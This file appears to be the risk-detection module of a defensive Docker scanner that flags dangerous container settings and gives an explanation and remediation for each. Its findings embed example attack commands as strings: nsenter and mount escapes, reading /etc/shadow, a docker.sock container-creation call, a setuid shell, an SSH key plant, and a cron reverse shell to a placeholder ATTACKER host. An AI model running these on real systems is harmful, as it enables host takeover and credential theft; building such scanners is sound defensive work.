"""
Risk Detection - Security risk detection for Docker containers.

Every finding corresponds to a real attack: if the tool cannot finish the
sentence "because of this setting, an attacker inside that container can
[specific action]", the finding does not belong here.

Detection categories:
- CRITICAL: Docker socket, privileged mode, SYS_ADMIN, writable dangerous
            host mounts, host PID namespace
- HIGH:     Host network mode, SYS_PTRACE
"""

from __future__ import annotations

from typing import Optional

from dockerscope.config.load_config import load_config
from dockerscope.core.discovery import ContainerInfo
from dockerscope.models.risk import Risk

# Dangerous paths for container mounts
DOCKER_SOCK_PATHS = {"/var/run/docker.sock", "/run/docker.sock"}
DANGEROUS_HOST_MOUNTS = {
    "/",  # Root filesystem
    "/etc",  # System configuration
    "/root",  # Root home directory
    "/boot",  # Boot partition
    "/var/lib/docker",  # Docker data directory
    "/usr/bin",  # System binaries
    "/usr/sbin",  # System admin binaries
    "/proc",  # Process information
    "/sys",  # System information
    "/dev",  # Device files
}

# Dangerous namespace modes
DANGEROUS_NAMESPACE_MODES = {"host"}


def _is_dangerous_mount(source: str, destination: str) -> bool:
    """
    Check if a mount targets a dangerous host path.

    Checks both exact matches and subpaths of dangerous locations.
    For example, /etc/ssh is dangerous because it's under /etc.
    """
    if not source:
        return False

    source = str(source)

    if source in DANGEROUS_HOST_MOUNTS:
        return True

    for base in DANGEROUS_HOST_MOUNTS:
        if base == "/":
            continue
        if source.startswith(base + "/"):
            return True

    return False


def _is_running_as_root(container: ContainerInfo) -> bool:
    """Check if container is running as root user."""
    user = getattr(container, "user", None)
    if user is None:
        return False
    return user in ("root", "0", "")


def _root_context_note(container: ContainerInfo) -> str:
    """Return a note about root status to append to attack explanations."""
    if _is_running_as_root(container):
        return " This container runs as root, so no privilege escalation is needed inside the container."
    return ""


def evaluate_container_risks(container: ContainerInfo) -> list[Risk]:
    """
    Evaluate a container for security risks.

    Only returns findings where we can describe the exact commands an
    attacker would run to exploit the misconfiguration.
    """
    risks: list[Risk] = []
    root_note = _root_context_note(container)

    # === CRITICAL: Privileged container ===
    if container.privileged:
        risks.append(
            Risk(
                container=container.name,
                risk_type="privileged_container",
                severity="CRITICAL",
                description="Container runs in privileged mode.",
                attack_explanation=(
                    "An attacker inside this container has full access to all host "
                    "devices and can escape to the host with a single command. "
                    "Privileged mode disables almost all container isolation." + root_note
                ),
                attack_commands=[
                    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                    "mount /dev/sda1 /mnt && chroot /mnt",
                ],
                remediation=(
                    "Remove 'privileged: true' from your docker-compose.yml. "
                    "If the container needs specific device access, use 'devices:' "
                    "to grant only what is needed."
                ),
                details={"network_mode": container.network_mode},
            )
        )

    # === CRITICAL: Docker socket mount ===
    for mount in container.mounts:
        src = mount.get("Source") or mount.get("src") or ""
        dst = mount.get("Destination") or mount.get("dst") or ""

        if src in DOCKER_SOCK_PATHS or dst in DOCKER_SOCK_PATHS:
            risks.append(
                Risk(
                    container=container.name,
                    risk_type="docker_sock_mount",
                    severity="CRITICAL",
                    description="Container has access to the Docker socket.",
                    attack_explanation=(
                        "An attacker inside this container can control the Docker "
                        "daemon. They can create a new privileged container that "
                        "mounts the host root filesystem, giving them full root "
                        "access to the host in seconds." + root_note
                    ),
                    attack_commands=[
                        (
                            "curl --unix-socket /var/run/docker.sock "
                            "http://localhost/v1.41/containers/create "
                            '-d \'{"Image":"alpine","HostConfig":'
                            '{"Privileged":true,"Binds":["/:/host"]}}\''
                        ),
                    ],
                    remediation=(
                        "Remove the docker.sock volume mount from your docker-compose.yml:\n"
                        "  - /var/run/docker.sock:/var/run/docker.sock  # DELETE THIS LINE\n\n"
                        "If this container genuinely needs Docker API access (e.g., Portainer, "
                        "Watchtower), use a docker-socket-proxy (tecnativa/docker-socket-proxy) "
                        "to limit which API endpoints are accessible."
                    ),
                    details={"source": src, "destination": dst},
                )
            )

    # === CRITICAL: SYS_ADMIN capability ===
    for cap in container.capabilities:
        if not cap.startswith("CAP_ADD:"):
            continue
        cap_name = cap.removeprefix("CAP_ADD:")
        if cap_name == "SYS_ADMIN":
            risks.append(
                Risk(
                    container=container.name,
                    risk_type="cap_sys_admin",
                    severity="CRITICAL",
                    description="Container has CAP_SYS_ADMIN capability.",
                    attack_explanation=(
                        "An attacker inside this container can mount the host "
                        "filesystem. SYS_ADMIN grants near-root privileges "
                        "including the ability to mount devices, create namespaces, "
                        "and bypass most container isolation." + root_note
                    ),
                    attack_commands=[
                        "mount /dev/sda1 /mnt",
                        "cat /mnt/etc/shadow",
                    ],
                    remediation=(
                        "Remove 'SYS_ADMIN' from cap_add in your docker-compose.yml. "
                        "This capability is almost never needed. If the container "
                        "requires specific mount operations, consider using a more "
                        "targeted solution."
                    ),
                    details={"capability": cap_name},
                )
            )

    # === CRITICAL: Host PID namespace ===
    pid_mode = getattr(container, "pid_mode", None)
    if pid_mode and pid_mode in DANGEROUS_NAMESPACE_MODES:
        risks.append(
            Risk(
                container=container.name,
                risk_type="host_pid_mode",
                severity="CRITICAL",
                description="Container shares the host PID namespace.",
                attack_explanation=(
                    "An attacker inside this container can see all host processes "
                    "and use nsenter to escape into the host's namespaces. With "
                    "access to PID 1, they can get a root shell on the host." + root_note
                ),
                attack_commands=[
                    "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                ],
                remediation=(
                    "Remove 'pid: host' from your docker-compose.yml. Most containers "
                    "do not need to see host processes."
                ),
                details={"pid_mode": pid_mode},
            )
        )

    # === CRITICAL: Dangerous writable host mounts ===
    for mount in container.mounts:
        src = mount.get("Source") or mount.get("src") or ""
        dst = mount.get("Destination") or mount.get("dst") or ""
        mode = mount.get("Mode", "rw")

        if not _is_dangerous_mount(src, dst):
            continue
        if src in DOCKER_SOCK_PATHS:
            continue

        is_writable = "rw" in mode.lower()

        if not is_writable:
            # Read-only mounts to sensitive paths are not escape vectors
            continue

        # Determine specific attack based on the path
        if src == "/" or src == "/etc" or src.startswith("/etc/"):
            attack_cmds = [
                f"echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > {dst}/cron.d/backdoor",
            ]
        elif (
            src in ("/usr/bin", "/usr/sbin")
            or src.startswith("/usr/bin/")
            or src.startswith("/usr/sbin/")
        ):
            attack_cmds = [
                f"cp /bin/bash {dst}/evil && chmod +s {dst}/evil",
            ]
        elif src == "/root" or src.startswith("/root/"):
            attack_cmds = [
                f"echo 'attacker-key' >> {dst}/.ssh/authorized_keys",
            ]
        else:
            attack_cmds = [
                f"# Write malicious files to {dst} (mounted from host {src})",
            ]

        risks.append(
            Risk(
                container=container.name,
                risk_type="dangerous_host_mount",
                severity="CRITICAL",
                description=f"Container has writable mount to sensitive host path: {src}",
                attack_explanation=(
                    f"An attacker inside this container can write to {src} on "
                    f"the host. Depending on the path, this enables writing cron "
                    f"jobs, modifying system binaries, planting SSH keys, or "
                    f"other forms of persistent host compromise." + root_note
                ),
                attack_commands=attack_cmds,
                remediation=(
                    f"Remove the volume mount or make it read-only:\n"
                    f"  - {src}:{dst}:ro  # Add :ro to make read-only\n\n"
                    f"If write access is truly needed, mount only the specific "
                    f"subdirectory required instead of the entire {src} tree."
                ),
                details={
                    "source": src,
                    "destination": dst,
                    "mode": mode,
                    "writable": True,
                },
            )
        )

    # === HIGH: Host network mode ===
    if container.network_mode == "host":
        risks.append(
            Risk(
                container=container.name,
                risk_type="host_network_mode",
                severity="HIGH",
                description="Container uses host network mode.",
                attack_explanation=(
                    "An attacker inside this container shares the host's network "
                    "stack. They can sniff traffic on all host interfaces, bind to "
                    "any port, access services listening on localhost (databases, "
                    "admin panels), and ARP spoof other devices on the LAN." + root_note
                ),
                attack_commands=[
                    "tcpdump -i any -w capture.pcap",
                    "curl http://127.0.0.1:9090  # access host-only services",
                ],
                remediation=(
                    "Replace 'network_mode: host' with bridge networking and "
                    "explicit port mappings:\n"
                    "  ports:\n"
                    '    - "8080:8080"  # Map only the ports you need'
                ),
                details={},
            )
        )

    # === HIGH: SYS_PTRACE capability ===
    for cap in container.capabilities:
        if not cap.startswith("CAP_ADD:"):
            continue
        cap_name = cap.removeprefix("CAP_ADD:")
        if cap_name == "SYS_PTRACE":
            risks.append(
                Risk(
                    container=container.name,
                    risk_type="cap_sys_ptrace",
                    severity="HIGH",
                    description="Container has CAP_SYS_PTRACE capability.",
                    attack_explanation=(
                        "An attacker inside this container can use ptrace to attach "
                        "to and inject code into other processes. When combined with "
                        "host PID mode, this enables process injection on the host." + root_note
                    ),
                    attack_commands=[
                        "# With host PID mode: inject into host processes",
                        "nsenter --target <HOST_PID> --mount --uts --ipc --net --pid -- /bin/bash",
                    ],
                    remediation=(
                        "Remove 'SYS_PTRACE' from cap_add in your docker-compose.yml. "
                        "This capability is rarely needed outside of debugging scenarios."
                    ),
                    details={"capability": cap_name},
                )
            )

    return risks


def filter_risks_with_whitelist(risks: list[Risk], cfg: Optional[dict] = None) -> list[Risk]:
    """
    Filter risks based on whitelist configuration.

    Allows users to acknowledge and accept specific risks for specific
    containers. Useful for tools like Portainer or Watchtower that
    legitimately need elevated privileges.

    Example config (~/.dockerscope/config.yaml):
        whitelist:
          portainer:
            allow:
              - docker_sock_mount
          watchtower:
            allow:
              - docker_sock_mount
    """
    if cfg is None:
        cfg = load_config() or {}

    whitelist_cfg = cfg.get("whitelist", {})

    if not whitelist_cfg:
        return risks

    filtered: list[Risk] = []

    for risk in risks:
        container_cfg = whitelist_cfg.get(risk.container)

        if not isinstance(container_cfg, dict):
            filtered.append(risk)
            continue

        allowed = set(container_cfg.get("allow", []))

        if risk.risk_type in allowed:
            continue

        filtered.append(risk)

    return filtered
